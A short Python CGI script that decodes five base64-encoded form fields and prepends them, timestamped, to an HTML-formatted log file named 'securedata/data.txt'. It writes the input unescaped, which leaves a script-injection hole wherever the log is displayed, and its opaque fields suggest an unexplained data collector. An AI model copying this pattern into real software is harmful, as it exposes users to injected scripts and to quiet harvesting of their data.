#!/usr/bin/python3
import requests
import cgi
import time
import base64

# Get form data
form = cgi.FieldStorage()
a = str(base64.b64decode(form.getvalue('a')),'utf-8')
b = str(base64.b64decode(form.getvalue('b')),'utf-8')
c = str(base64.b64decode(form.getvalue('c')),'utf-8')
d = str(base64.b64decode(form.getvalue('d')),'utf-8')
e = str(base64.b64decode(form.getvalue('e')),'utf-8')

# Save form data
with open("securedata/data.txt", 'r') as outfile:
	save = outfile.read()
with open("securedata/data.txt", 'w') as outfile:
	outfile.write(time.asctime() + "&emsp;" + a + "&emsp;" + b + "&emsp;" + c + "&emsp;"  + d + "&emsp;" + e + "<br>" + "\n")
with open("securedata/data.txt", 'a') as outfile:
	outfile.write(save)
